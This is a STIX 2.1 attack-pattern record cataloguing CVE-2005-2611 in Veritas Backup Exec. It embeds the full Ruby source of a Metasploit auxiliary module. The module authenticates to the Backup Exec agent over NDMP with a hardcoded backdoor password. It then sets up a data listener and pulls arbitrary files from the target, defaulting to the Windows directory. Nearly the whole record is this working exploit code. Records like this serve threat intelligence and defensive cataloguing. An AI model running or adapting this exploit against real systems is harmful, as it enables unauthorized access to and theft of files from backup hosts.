{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3b3ec6aa-669a-4f88-9f38-6781aecd9113",
    "created": "2024-08-14T16:22:50.137868Z",
    "modified": "2024-08-14T16:22:50.137872Z",
    "name": "Veritas Backup Exec Windows Remote File Access",
    "description": " This module abuses a logic flaw in the Backup Exec Windows Agent to download arbitrary files from the system. This flaw was found by someone who wishes to remain anonymous and affects all known versions of the Backup Exec Windows Agent. The output file is in 'MTF' format, which can be extracted by the 'NTKBUp' program listed in the references section. To transfer an entire directory, specify a path that includes a trailing backslash. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/backupexec/dump.rb",
            "external_id": "dump.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2005-2611"
        },
        {
            "source_name": "reference",
            "url": "https://web.archive.org/web/20120227144337/http://www.fpns.net/willy/msbksrc.lzh"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::NDMP\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Veritas Backup Exec Windows Remote File Access',\n      'Description'    => %q{\n        This module abuses a logic flaw in the Backup Exec Windows Agent to download\n        arbitrary files from the system. This flaw was found by someone who wishes to\n        remain anonymous and affects all known versions of the Backup Exec Windows Agent. The\n        output file is in 'MTF' format, which can be extracted by the 'NTKBUp' program\n        listed in the references section. To transfer an entire directory, specify a\n        path that includes a trailing backslash.\n      },\n      'Author'         => [ 'hdm', 'Unknown' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2005-2611'],\n          ['OSVDB', '18695'],\n          ['BID', '14551'],\n          ['URL', 'https://web.archive.org/web/20120227144337/http://www.fpns.net/willy/msbksrc.lzh'],\n        ],\n      'Actions'     =>\n        [\n          ['Download', 'Description' => 'Download arbitrary file']\n        ],\n      'DefaultAction' => 'Download'\n      ))\n\n    register_options(\n      [\n        Opt::RPORT(10000),\n        OptAddressLocal.new('LHOST',\n          [\n            false,\n            \"The local IP address to accept the data connection\"\n          ]\n        ),\n        OptPort.new('LPORT',\n          [\n            false,\n            \"The local port to accept the data connection\"\n          ]\n        ),\n        OptString.new('RPATH',\n          [\n            true,\n            \"The remote filesystem path to download\",\n            \"C:\\\\Windows\\\\win.ini\"\n          ]\n        ),\n        OptString.new('LPATH',\n          [\n            true,\n            \"The local filename to store the exported data\",\n            \"backupexec_dump.mtf\"\n          ]\n        ),\n      ])\n  end\n\n  def run\n    print_status(\"Attempting to retrieve #{datastore['RPATH']}...\")\n\n    lfd = File.open(datastore['LPATH'], 'wb')\n\n    connect\n    data = ndmp_recv()\n    if (not data)\n      print_error(\"Did not receive a response from the agent\")\n      disconnect\n      return\n    end\n\n    username = \"root\"\n    password = \"\\xb4\\xb8\\x0f\\x26\\x20\\x5c\\x42\\x34\\x03\\xfc\\xae\\xee\\x8f\\x91\\x3d\\x6f\"\n\n    #\n    # Authenticate using the backdoor password\n    #\n    auth = [\n      1,\n      Time.now.to_i,\n      0,\n      0x0901,\n      0,\n      0,\n      2,\n      username.length,\n      username,\n      password\n    ].pack('NNNNNNNNA*A*')\n\n    print_status(\"Sending magic authentication request...\")\n    ndmp_send(auth)\n    data = ndmp_recv()\n    if (not data)\n      print_error(\"Did not receive a response to our authentication request\")\n      disconnect\n      return\n    end\n\n\n    #\n    # Create our listener for the data connection\n    #\n    print_status(\"Starting our data listener...\")\n    sfd = Rex::Socket.create_tcp_server(\n      'LocalPort' => datastore['LPORT']\n    )\n\n    local_addr = (datastore['LHOST'] || Rex::Socket.source_address(datastore['RHOST']))\n    local_port = sfd.getsockname[2]\n\n    #\n    # Create the DATA_CONNECT request\n    #\n    conn = [\n      3,\n      0,\n      0,\n      0x040a,\n      0,\n      0,\n      1,\n      Rex::Socket.resolv_nbo(local_addr, false),\n      local_port\n    ].pack('NNNNNNNA4N')\n\n    print_status(\"Sending data connection request...\")\n    ndmp_send(conn)\n    data = ndmp_recv()\n    if (not data)\n      print_error(\"Did not receive a response to our data connection request\")\n      sfd.close\n      disconnect\n      return\n    end\n\n    #\n    # Wait for the agent to connect back\n    #\n    print_status(\"Waiting for the data connection...\")\n    rfd = sfd.accept()\n    sfd.close\n\n\n    #\n    # Create the Mover Set Record Size request\n    #\n    msrs = [\n      4,\n      0,\n      0,\n      0x0a08,\n      0,\n      0,\n      0x8000\n    ].pack('NNNNNNN')\n\n    print_status(\"Sending transfer parameters...\")\n    ndmp_send(msrs)\n    data = ndmp_recv()\n    if (not data)\n      print_error(\"Did not receive a response to our parameters request\")\n      disconnect\n      return\n    end\n\n    #\n    # Define our tranfer parameters\n    #\n    xenv =\n    [\n      ['USERNAME', ''],\n      ['BU_EXCLUDE_ACTIVE_FILES', '0'],\n      ['FILESYSTEM', \"\\\"\\\\\\\\#{datastore['RHOST']}\\\\#{datastore['RPATH']}\\\",v0,t0,l0,n0,f0\"]\n    ]\n\n    #\n    # Create the DATA_START_BACKUP request\n    #\n    bkup = [\n      5,\n      0,\n      0,\n      0x0401,\n      0,\n      0,\n      4\n    ].pack('NNNNNNN')\n    bkup += \"dump\"\n    bkup += [ xenv.length ].pack('N')\n\n    #\n    # Encode the transfer parameters\n    #\n    xenv.each do |e|\n      k,v = e\n\n      # Variable\n      bkup += [k.length].pack('N')\n      bkup += k\n      bkup += Rex::Encoder::NDR.align(k)\n\n      # Value\n      bkup += [v.length].pack('N')\n      bkup += v\n      bkup += Rex::Encoder::NDR.align(v)\n    end\n\n    bkup[-1, 1] = \"\\x01\"\n\n    print_status(\"Sending backup request...\")\n    ndmp_send(bkup)\n    data = ndmp_recv()\n    if (not data)\n      print_error(\"Did not receive a response to our backup request\")\n      disconnect\n      return\n    end\n\n    #\n    # Create the GET_ENV request\n    #\n    genv = [\n      5,\n      0,\n      0,\n      0x4004,\n      0,\n      0\n    ].pack('NNNNNN')\n\n    print_status(\"Sending environment request...\")\n    ndmp_send(genv)\n    data = ndmp_recv()\n    if (not data)\n      print_error(\"Did not receive a response to our environment request\")\n      disconnect\n      return\n    end\n\n    #\n    # Start transferring data\n    #\n    print_status(\"Transferring data...\")\n    bcnt = 0\n\n    begin\n      while (data = rfd.get_once)\n        bcnt += data.length\n        lfd.write(data)\n      end\n    rescue ::EOFError\n    end\n\n    lfd.close\n    rfd.close\n\n    print_status(\"Transferred #{bcnt} bytes.\")\n    disconnect\n\n  end\nend\n"
}